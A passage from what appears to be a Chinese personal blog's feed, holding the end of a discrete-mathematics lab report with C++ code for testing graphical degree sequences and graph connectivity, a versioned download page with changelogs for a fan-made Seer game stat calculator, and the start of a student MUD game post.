class="line">		b[<span class="number">1</span>][i] = i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>; j&lt;n; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> k=<span class="number">0</span>; k&lt;n; k++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (b[<span class="number">1</span>][k]==i &amp;&amp; b[<span class="number">0</span>][k]&gt;<span class="number">0</span> &amp;&amp; b[<span class="number">0</span>][j]&gt;<span class="number">0</span> &amp;&amp; i&lt;b[<span class="number">1</span>][j])</span><br><span class="line">				&#123;</span><br><span class="line">					m[i][b[<span class="number">1</span>][j]] = <span class="number">1</span>;</span><br><span class="line">					m[b[<span class="number">1</span>][j]][i] = <span class="number">1</span>;</span><br><span class="line">					b[<span class="number">0</span>][j]--;</span><br><span class="line">					b[<span class="number">0</span>][k]--;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">sort2</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;其相邻矩阵为：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>; j&lt;n; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cout &lt;&lt; m[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//连通 </span></span><br><span class="line"><span class="comment">// 使用深度优先搜索判断图的连通性</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">bool</span> visited[], <span class="type">int</span> node)</span> </span>&#123;</span><br><span class="line">    visited[node] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> neighbor = <span class="number">0</span>; neighbor &lt; n; ++neighbor) &#123;</span><br><span class="line">        <span class="keyword">if</span> (m[node][neighbor] == <span class="number">1</span> &amp;&amp; !visited[neighbor]) &#123;</span><br><span class="line">            <span class="built_in">dfs</span>(visited, neighbor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断图的连通性</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Connected</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">bool</span> visited[n] = &#123;<span class="literal">false</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从第一个节点开始进行深度优先搜索</span></span><br><span class="line">    <span class="built_in">dfs</span>(visited, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查所有节点是否都被访问到</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!visited[i]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 存在未访问到的节点，图不连通</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 所有节点都被访问到，图连通</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//从用户输入获取非负整数序列</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;请输入个数n：(输入0退出)&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cin &gt;&gt; n;</span><br><span class="line">		nn = n;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (n==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++) cin &gt;&gt; array[i];</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++) a[i] = array[i];</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">100</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">100</span>; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				m[i][j] = <span class="number">0</span>; </span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//判断是否可图化</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">Graphitization</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;该序列可图化&quot;</span> &lt;&lt; endl;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//判断是否可简单图化</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">Graphitization_simple</span>())</span><br><span class="line">			&#123;</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;故该序列可简单图化&quot;</span> &lt;&lt; endl;</span><br><span class="line">				<span class="built_in">Adjacency_matrix</span>();</span><br><span class="line">				<span class="comment">//判断图是否连通</span></span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">Connected</span>()) cout &lt;&lt; <span class="string">&quot;且该图是连通的&quot;</span> &lt;&lt; endl;</span><br><span class="line">				<span class="keyword">else</span>  cout &lt;&lt; <span class="string">&quot;且该图是不连通的&quot;</span> &lt;&lt; endl;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;故该序列不可简单图化&quot;</span> &lt;&lt; endl;</span><br><span class="line">			</span><br><span class="line">		&#125; </span><br><span class="line">		<span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;该序列不可图化&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4、调试分析"><a href="#4、调试分析" class="headerlink" title="4、调试分析"></a>4、调试分析</h3><ul>
<li><p>（1）调试过程中所遇到的问题及解决方法：</p>
<ul>
<li><p>判断可图化时未考虑到全0的情况导致出错</p>
<p>解决方法：将<code>sum!=0</code>加入if判断</p>
</li>
<li><p>判断可简单图化时未考虑到<code>n-1≥d1</code>的情况</p>
<p>解决方法：已添加</p>
</li>
<li><p>判断连通时未熟练掌握DFS</p>
<p>解决方法：通过网上的素材借鉴理解学习</p>
</li>
</ul>
</li>
<li><p>（2）算法的时空分析：</p>
<ul>
<li><ol>
<li><p>Graphitization(array)</p>
<p>时间复杂性：</p>
<ul>
<li>算法中的循环次数与输入数组的长度成正比，因此时间复杂性为 O(n)。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>仅使用常量级别的额外空间，因此空间复杂性为 O(1)。</li>
</ul>
</li>
<li><p>Graphitization_simple(array)</p>
<p>时间复杂性：</p>
<ul>
<li>算法中的排序操作为 O(n log n)，其中 n 为数组的长度。</li>
<li>主循环的时间复杂性主要取决于排序操作，因此总体时间复杂性为 O(n log n)。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>除了输入数组外，仅使用了常量级别的额外空间，因此空间复杂性为 O(1)。</li>
</ul>
</li>
<li><p>sort_two(a)</p>
<p>时间复杂性：</p>
<ul>
<li>该算法是选择排序，时间复杂性为 O(n^2)，其中 n 为二维列表中的列数。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>仅使用常量级别的额外空间，因此空间复杂性为 O(1)。</li>
</ul>
</li>
<li><p>Adjacency_matrix(array, m)</p>
<p>时间复杂性：</p>
<ul>
<li>该算法中的主循环中包含排序和嵌套循环，因此时间复杂性可能高达 O(n^3)，其中 n 为数组的长度。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>除了输入数组和邻接矩阵外，仅使用了常量级别的额外空间，因此空间复杂性为 O(n^2)。</li>
</ul>
</li>
<li><p>Connected(m)</p>
<p>时间复杂性：</p>
<ul>
<li>深度优先搜索的时间复杂性为 O(V + E)，其中 V 为节点数，E 为边数。在这里，E 的最坏情况可能是 O(n^2)，因此总体时间复杂性为 O(n^2)。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>除了输入的邻接矩阵和递归调用栈，仅使用了常量级别的额外空间，因此空间复杂性为 O(n)。</li>
</ul>
</li>
<li><p>总体时空复杂性：</p>
<ul>
<li>主程序的循环次数取决于用户输入，可以忽略。</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
<li><p>这里的分析是基于每个算法的最坏情况。</p>
</li>
<li><p>实际性能可能会受到不同输入情况的影响。</p>
</li>
</ul>
<h2 id="（五）实验结果"><a href="#（五）实验结果" class="headerlink" title="（五）实验结果"></a>（五）实验结果</h2><p><img src="/img/discrete/1/3.png" alt="img"></p>
<p><img src="/img/discrete/1/4.png" alt="img"></p>
<p><img src="/img/discrete/1/5.png" alt="img"></p>
<p><img src="/img/discrete/1/6.png" alt="img"></p>
<p><img src="/img/discrete/1/7.png" alt="img"></p>
<p><img src="/img/discrete/1/8.png" alt="img"></p>
<p><img src="/img/discrete/1/9.png" alt="img"></p>
<h2 id="（六）实验总结"><a href="#（六）实验总结" class="headerlink" title="（六）实验总结"></a>（六）实验总结</h2><ul>
<li><p>实验过程中的感悟和体会：</p>
<ol>
<li><p>图论知识的应用：</p>
<p>通过编写判断序列是否可图化、可简单图化的程序，深入理解了图论中的一些概念，例如图的连通性和邻接矩阵的应用。</p>
</li>
<li><p>深度优先搜索的重要性：</p>
<p>实验中通过深度优先搜索判断图的连通性，深刻体会到深度优先搜索在图算法中的重要性。这种算法可以用来遍历图，查找路径，判断连通性等。</p>
</li>
<li><p>函数模块化的优势：</p>
<p>将任务分解成不同的函数，每个函数负责一个明确的功能，提高了代码的可读性和可维护性。每个函数成为一个模块，更易于理解和测试。</p>
</li>
<li><p>异常处理的重要性：</p>
<p>在用户输入时，通过异常处理机制可以有效地捕获错误，向用户提供友好的提示信息。这对于用户友好性和程序的稳定性都是至关重要的。</p>
</li>
</ol>
</li>
<li><p>经验和教训：</p>
<ol>
<li><p>合理利用函数：</p>
<p>函数的使用使代码更为模块化和结构化，有助于提高代码的可读性。在实验中，函数的设计有助于更好地组织和管理代码。</p>
</li>
<li><p>注重异常处理：</p>
<p>在用户输入部分，通过对异常的捕获和处理，提高了程序的健壮性。对于用户可能输入错误的情况，提供清晰的错误提示是良好实践。</p>
</li>
<li><p>代码注释和输出信息：</p>
<p>充分利用注释和输出信息，有助于自己和其他人更好地理解代码的逻辑和执行流程。在输出信息中，提供详细和清晰的结果有助于用户理解程序运行的结果。</p>
</li>
<li><p>持续学习和改进：</p>
<p>在实验中可能遇到一些挑战和问题，但通过不断学习和改进，能够更好地理解问题的本质，并提高解决问题的能力。</p>
</li>
</ol>
</li>
<li><p>总结：</p>
<p>通过这个实验，不仅巩固了图论的相关知识，还提高了编写图算法的能力。在实践中，注重代码的可读性、异常处理和输出信息，是编写高质量代码的关键。在今后的学习和工作中，将继续保持学习的态度，不断提升编程技能。</p>
</li>
</ul>
<p>参考文献：<a href="https://www.imbai.cn/posts/4324.html">离散数学II实验一 ： 白</a></p>
]]></content>
      <categories>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>作业</tag>
        <tag>实验报告</tag>
        <tag>离散数学</tag>
        <tag>离散</tag>
        <tag>Python</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>精灵配置计算器-下载</title>
    <url>/posts/pz.html</url>
    <content><![CDATA[<a href="https://fourfire.lanzout.com/b011ldua3g" target="_blank" title="精灵配置计算器（蓝奏云）" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/蓝奏云.jpg" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器（蓝奏云）</div><div class="link_desc">蓝奏云下载地址</div></div></a>
<h2 id="最新版本Latest"><a href="#最新版本Latest" class="headerlink" title="最新版本Latest"></a>最新版本Latest</h2><div style="background-color: black; height: 2px; width:100%; "></div>

<h3 id="4-2-（-2025-6-15-）"><a href="#4-2-（-2025-6-15-）" class="headerlink" title="# 4.2 （ 2025 / 6 / 15 ）"></a># 4.2 （ 2025 / 6 / 15 ）</h3><a href="https://fourfire.cc/file/精灵配置计算器4.2.zip" target="_blank" title="精灵配置计算器4.2" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器4.2</div><div class="link_desc">点击下载</div></div></a>
<details class="folding-tag" green><summary> 更新日志 </summary>
              <div class='content'>
              <p>● 新增了<strong>黑翼天马·克萨雷恩（神谕）</strong>，<strong>冰魄·柯尔德（神谕）</strong>的『种族值』</p><p>● 更改了『智能选印』的部分默认设置——字体<code>13</code>，过滤总和<code>230</code>以下的5角刻印，只取各项数值总和前<code>100</code>名的刻印</p><p>● 修复了『智能选印』部分情况下筛选刻印时数值计算出错的bug<br>● 修复了『智能选印』能出现3个同系列刻印组合的bug<br>● 修复了『智能选印』部分新增的限一刻印能出现2次的bug</p>
              </div>
            </details>
<p><img src="/img/seer/pz.png" alt="展示图"></p>
<div style="height: 80px;"></div>

<h2 id="历史版本"><a href="#历史版本" class="headerlink" title="历史版本"></a>历史版本</h2><div style="background-color: black; height: 2px; width:100%; "></div>

<h3 id="4-1-（-2025-4-3-）"><a href="#4-1-（-2025-4-3-）" class="headerlink" title="# 4.1 （ 2025 / 4 / 3 ）"></a># 4.1 （ 2025 / 4 / 3 ）</h3><a href="https://fourfire.cc/file/精灵配置计算器4.1.zip" target="_blank" title="精灵配置计算器4.1" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器4.1</div><div class="link_desc">点击下载</div></div></a>
<details class="folding-tag" blue><summary> 更新日志 </summary>
              <div class='content'>
              <p>● 新增了『影翼裁决』套装</p><p>● 优化了启动软件时对文件夹完整性的检查，把容易报错的部分删了不检查。</p>
              </div>
            </details>
<h3 id="4-0-（-2025-2-27-）"><a href="#4-0-（-2025-2-27-）" class="headerlink" title="# 4.0 （ 2025 / 2 / 27 ）"></a># 4.0 （ 2025 / 2 / 27 ）</h3><a href="https://fourfire.cc/file/精灵配置计算器4.0.exe" target="_blank" title="精灵配置计算器4.0" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器4.0</div><div class="link_desc">只需替换原来文件夹中的exe即可，就算没有文件夹也不用额外下载了，现在会像CHIKA和雷小伊一样自动生成了。</div></div></a>
<details class="folding-tag" blue><summary> 更新日志 </summary>
              <div class='content'>
              <p>● 新增了启动软件时的进度条提示<br>● 新增了字体大小的设置（所有界面）</p><p>● 优化了启动软件时对文件夹完整性的检查，同时解决了“必须绑定文件夹”的这一弊端<br>● 优化了整个软件窗口的大小，现在可以在一定范围内自由缩放<br>● 优化了『智能选印』的部分选项交互（如原先『只选物攻』和『只选特攻』并不互斥）<br>● 优化了刻印名的显示，过长的刻印名将被省略号折叠</p><p>● 修复了『智能选印』在“选择除了5角以外的其他角数”时会卡死的bug</p>
              </div>
            </details>
<h3 id="3-1-（-2025-2-14-）"><a href="#3-1-（-2025-2-14-）" class="headerlink" title="# 3.1 （ 2025 / 2 / 14 ）"></a># 3.1 （ 2025 / 2 / 14 ）</h3><a href="https://fourfire.cc/file/精灵配置计算器3.1.zip" target="_blank" title="精灵配置计算器3.1" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器3.1</div><div class="link_desc">标准版</div></div></a>
<a href="https://fourfire.cc/file/精灵配置计算器3.1（小号字体）.zip" target="_blank" title="精灵配置计算器3.1（小号字体）" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器3.1（小号字体）</div><div class="link_desc">觉得上面的字体有点大的下载这个</div></div></a>
<a href="https://fourfire.cc/file/精灵配置计算器3.1（超小号字体）.zip" target="_blank" title="精灵配置计算器3.1（超小号字体）" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器3.1（超小号字体）</div><div class="link_desc">如果小号字体对你来说也很大了，下载这个吧，一般是缩放200%的电脑才会出现这种情况……</div></div></a>
<details class="folding-tag" blue><summary> 更新日志 </summary>
              <div class='content'>
              <p>● 修复了全部【防御型】性格数值计算错误的bug</p>
              </div>
            </details>
<h3 id="3-0-（-2025-2-14-）"><a href="#3-0-（-2025-2-14-）" class="headerlink" title="# 3.0 （ 2025 / 2 / 14 ）"></a># 3.0 （ 2025 / 2 / 14 ）</h3><a href="https://fourfire.cc/file/精灵配置计算器3.0.zip" target="_blank" title="精灵配置计算器3.0" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器3.0</div><div class="link_desc">标准版</div></div></a>
<a href="https://fourfire.cc/file/精灵配置计算器3.0（小号字体）.zip" target="_blank" title="精灵配置计算器3.0（小号字体）" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器3.0（小号字体）</div><div class="link_desc">觉得上面的字体有点大的下载这个</div></div></a>
<a href="https://fourfire.cc/file/精灵配置计算器3.0（超小号字体）.zip" target="_blank" title="精灵配置计算器3.0（超小号字体）" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器3.0（超小号字体）</div><div class="link_desc">如果小号字体对你来说也很大了，下载这个吧，一般是缩放200%的电脑才会出现这种情况……</div></div></a>
<details class="folding-tag" blue><summary> 更新日志 </summary>
              <div class='content'>
              <p>● 新增了体力性格『耐久』（+10%体力），仅供娱乐<br>● 新增了『智能选印』，能根据最终面板算出所有可能的刻印组合<br>● 新增了刻印数值的显示，方式为点击刻印图片<br>● 新增了种族值总和，学习力总和的显示<br>● 新增了『额外数值』这一通过魂印增加能力值选项（如王哈魂印，飞王魂印等）<br>● 新增了『魂印』和『技能』功能，呈现方式同QQ机器人<br>● 新增了『复制到剪贴板』功能，能将当前计算的配置面板一键复制，无需额外截图</p><p>● （该版本存在影响正常使用的致命bug，将在3.1修复）</p>
              </div>
            </details>
<h3 id="2-4-（-2024-12-18-）"><a href="#2-4-（-2024-12-18-）" class="headerlink" title="# 2.4 （ 2024 / 12 / 18 ）"></a># 2.4 （ 2024 / 12 / 18 ）</h3><a href="https://fourfire.cc/file/精灵配置计算器2.4.zip" target="_blank" title="精灵配置计算器2.4" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器2.4</div><div class="link_desc">标准版</div></div></a>
<a href="https://fourfire.cc/file/精灵配置计算器2.4（小号字体）.zip" target="_blank" title="精灵配置计算器2.4（小号字体）" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器2.4（小号字体）</div><div class="link_desc">觉得上面的字体有点大的下载这个</div></div></a>
<a href="https://fourfire.cc/file/精灵配置计算器2.4（超小号字体）.zip" target="_blank" title="精灵配置计算器2.4（超小号字体）" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器2.4（超小号字体）</div><div class="link_desc">如果小号字体对你来说也很大了，下载这个吧，一般是缩放200%的电脑才会出现这种情况……</div></div></a>
<details class="folding-tag" blue><summary> 更新日志 </summary>
              <div class='content'>
              <p>● 修复了精灵头像的bug</p>
              </div>
            </details>
<h3 id="2-3-（-2024-12-03-）"><a href="#2-3-（-2024-12-03-）" class="headerlink" title="# 2.3 （ 2024 / 12 / 03 ）"></a># 2.3 （ 2024 / 12 / 03 ）</h3><a href="https://fourfire.cc/file/精灵配置计算器2.3.zip" target="_blank" title="精灵配置计算器2.3" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器2.3</div><div class="link_desc">标准版</div></div></a>
<a href="https://fourfire.cc/file/精灵配置计算器2.3（小号字体）.zip" target="_blank" title="精灵配置计算器2.3（小号字体）" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器2.3（小号字体）</div><div class="link_desc">觉得上面的字体有点大的下载这个</div></div></a>
<a href="https://fourfire.cc/file/精灵配置计算器2.3（超小号字体）.zip" target="_blank" title="精灵配置计算器2.3（超小号字体）" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器2.3（超小号字体）</div><div class="link_desc">如果小号字体对你来说也很大了，下载这个吧，一般是缩放200%的电脑才会出现这种情况……</div></div></a>
<details class="folding-tag" blue><summary> 更新日志 </summary>
              <div class='content'>
              <p>● 新增了『管理资源』功能，可以下载和删除资源。下载后能离线使用计算器了，同时避免了一些闪退问题。当然，不下载也行，省空间。<br>● 新增了bug提示</p><p>● 优化了文件夹结构，更加清晰明了</p><p>● 修复了刻印图片不存在时会闪退的bug，如<code>华光之翼·杰洛恩专属全能刻印</code></p>
              </div>
            </details>
<h3 id="2-2-（-2024-12-01-）"><a href="#2-2-（-2024-12-01-）" class="headerlink" title="# 2.2 （ 2024 / 12 / 01 ）"></a># 2.2 （ 2024 / 12 / 01 ）</h3><a href="https://fourfire.cc/file/精灵配置计算器2.2.zip" target="_blank" title="精灵配置计算器2.2" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器2.2</div><div class="link_desc">标准版</div></div></a>
<a href="https://fourfire.cc/file/精灵配置计算器2.2（小号字体）.zip" target="_blank" title="精灵配置计算器2.2（小号字体）" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器2.2（小号字体）</div><div class="link_desc">觉得上面的字体有点大的下载这个</div></div></a>
<a href="https://fourfire.cc/file/精灵配置计算器2.2（超小号字体）.zip" target="_blank" title="精灵配置计算器2.2（超小号字体）" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器2.2（超小号字体）</div><div class="link_desc">如果小号字体对你来说也很大了，下载这个吧，一般是缩放200%的电脑才会出现这种情况……</div></div></a>
<details class="folding-tag" blue><summary> 更新日志 </summary>
              <div class='content'>
              <p>● 修复了<strong>浩瀚昆仑（神谕）</strong>『种族值』显示不正确的bug</p><p>● 『导出图片』——『打开文件夹』时将自动关闭提示窗口</p>
              </div>
            </details>
<h3 id="2-1-（-2024-11-27-）"><a href="#2-1-（-2024-11-27-）" class="headerlink" title="# 2.1 （ 2024 / 11 / 27 ）"></a># 2.1 （ 2024 / 11 / 27 ）</h3><a href="https://fourfire.cc/file/精灵配置计算器2.1.zip" target="_blank" title="精灵配置计算器2.1" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器2.1</div><div class="link_desc">标准版</div></div></a>
<a href="https://fourfire.cc/file/精灵配置计算器2.1（小号字体）.zip" target="_blank" title="精灵配置计算器2.1（小号字体）" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器2.1（小号字体）</div><div class="link_desc">觉得上面的字体有点大的下载这个</div></div></a>
<a href="https://fourfire.cc/file/精灵配置计算器2.1（超小号字体）.zip" target="_blank" title="精灵配置计算器2.1（超小号字体）" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器2.1（超小号字体）</div><div class="link_desc">如果小号字体对你来说也很大了，下载这个吧，一般是缩放200%的电脑才会出现这种情况……</div></div></a>
<details class="folding-tag" blue><summary> 更新日志 </summary>
              <div class='content'>
              <p>● 修复了学习力总和可以大于<code>510</code>的bug</p><p>● 优化了部分字体的垂直居中显示</p>
              </div>
            </details>
<h3 id="2-0-（-2024-11-23-）"><a href="#2-0-（-2024-11-23-）" class="headerlink" title="# 2.0 （ 2024 / 11 / 23 ）"></a># 2.0 （ 2024 / 11 / 23 ）</h3><a href="https://fourfire.cc/file/精灵配置计算器2.0.zip" target="_blank" title="精灵配置计算器2.0" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器2.0</div><div class="link_desc">标准版</div></div></a>
<a href="https://fourfire.cc/file/精灵配置计算器2.0（小号字体）.zip" target="_blank" title="精灵配置计算器2.0（小号字体）" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器2.0（小号字体）</div><div class="link_desc">觉得上面的字体有点大的下载这个</div></div></a>
<a href="https://fourfire.cc/file/精灵配置计算器2.0（超小号字体）.zip" target="_blank" title="精灵配置计算器2.0（超小号字体）" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器2.0（超小号字体）</div><div class="link_desc">如果小号字体对你来说也很大了，下载这个吧，一般是缩放200%的电脑才会出现这种情况……</div></div></a>
<details class="folding-tag" blue><summary> 更新日志 </summary>
              <div class='content'>
              <p>● 修复了学习力MAX按钮的逻辑bug</p><p>● 优化了部分精灵的精灵头像，使其正常显示，例如苍星的普达头像，灵巢、星魂、奥特曼的赛尔头像<br>● 优化了没有立绘时的闪退处理</p><p>● 修改了图标所在位置，由C盘改成了当前文件夹，避免了一些权限的问题</p><p>● 删除了『确定精灵』这个多余的按钮，同时避免了不必要的交互漏洞，同时精灵名称和精灵序号将一同确定</p><p>● 新增了学习力『零』『全归零』的按钮<br>● 新增了『无套装』和『无称号』的选项<br>● 新增了『清空』刻印的功能<br>● 新增了『导出图片』的功能，将保存在当前文件夹<br>● 新增了『检查更新』的功能<br>● 新增了<strong>超小号字体</strong>版本</p><p>● 种族值范围修改为 <code>-99999</code> ~ <code>99999</code><br>● 默认称号改为“星光之旅”，称号顺序已根据当前版本优化</p>
              </div>
            </details>
<h3 id="1-0-（-2024-08-18-）"><a href="#1-0-（-2024-08-18-）" class="headerlink" title="# 1.0 （ 2024 / 08 / 18 ）"></a># 1.0 （ 2024 / 08 / 18 ）</h3><a href="https://fourfire.cc/file/精灵配置计算器1.0.zip" target="_blank" title="精灵配置计算器1.0" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器1.0</div><div class="link_desc">标准版</div></div></a>
<a href="https://fourfire.cc/file/精灵配置计算器1.0（小号字体）.zip" target="_blank" title="精灵配置计算器1.0（小号字体）" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/seer/图标.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">精灵配置计算器1.0（小号字体）</div><div class="link_desc">觉得上面的字体有点大的下载这个</div></div></a>
<details class="folding-tag" blue><summary> 更新日志 </summary>
              <div class='content'>
              <p>● 更新了无目镜（腐蚀）选项</p><p>● 新增了<strong>小号字体</strong>版本</p>
              </div>
            </details>
]]></content>
      <categories>
        <category>游戏相关</category>
      </categories>
      <tags>
        <tag>游戏</tag>
        <tag>赛尔号</tag>
      </tags>
  </entry>
  <entry>
    <title>自制游戏（小组合作-作业）</title>
    <url>/posts/game_Journey-to-the-West.html</url>
    <content><![CDATA[<blockquote>
<p>MUD小游戏——重生之西游记</p>
</blockquote>
<h2 id="开始界面"><a href="#开始界面" class="headerlink" title="开始界面"></a>开始界面</h2><p><img src="/img/Journey-to-the-West/1.png" alt="开始界面"></p>
<h2 id="故事背景"><a href="#故事背景" class="headerlink" title="故事背景"></a>故事背景</h2><p><img src="/img/Journey-to-the-West/2.png" alt="故事背景"></p>
<h2 id="角色选择"><a href="#角色选择" class="headerlink" title="角色选择"></a>角色选择</h2><p><img src="/img/Journey-to-the-West/3.png" alt="角色选择"></p>
